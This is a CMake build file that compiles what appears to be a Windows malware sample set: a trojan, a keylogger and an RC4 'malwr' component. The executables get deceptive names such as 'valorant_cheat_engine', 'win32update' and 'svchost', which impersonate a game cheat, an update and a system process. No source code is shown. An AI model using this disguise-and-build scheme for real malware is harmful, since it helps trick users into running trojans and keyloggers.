cmake_minimum_required(VERSION 3.10)

project(wintrapd)

set(CMAKE_C_STANDARD 11)

# b64tool
add_executable(b64tool b64tool.c b64tool.rc)
target_link_libraries(b64tool crypt32)
set_target_properties(b64tool PROPERTIES OUTPUT_NAME "b64tool")


# win32update
add_executable(win32update malwr_rc4.c msvc.rc)
set_target_properties(win32update PROPERTIES OUTPUT_NAME "win32update")


# valorant_cheat_engine
add_executable(valorant_cheat_engine trojan.c trojan.rc)
target_link_libraries(valorant_cheat_engine wininet shell32 crypt32)
set_target_properties(valorant_cheat_engine PROPERTIES OUTPUT_NAME "valorant_cheat_engine")


# msvcmon
add_executable(msvcmon kylg_winapi.c msvc.rc)
target_link_libraries(msvcmon user32 gdi32 kernel32)
set_target_properties(msvcmon PROPERTIES OUTPUT_NAME "msvcmon")


# svchost
add_executable(svchost svchost.c)
target_link_libraries(svchost wininet shell32)
set_target_properties(svchost PROPERTIES OUTPUT_NAME "svchost")
